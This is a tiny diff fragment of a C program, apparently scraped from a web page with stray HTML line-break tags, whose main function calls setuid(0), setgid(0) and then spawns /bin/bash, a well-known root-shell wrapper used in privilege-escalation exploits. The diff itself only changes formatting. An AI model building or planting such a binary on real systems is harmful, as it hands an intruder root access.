@@ -6,6 +6,6 @@
 #include <stdlib.h> <br>
 
 int main(void) <br>
-{
-  setuid(0); setgid(0); system("/bin/bash");
+{ <br>
+  setuid(0); setgid(0); system("/bin/bash"); <br>
 }
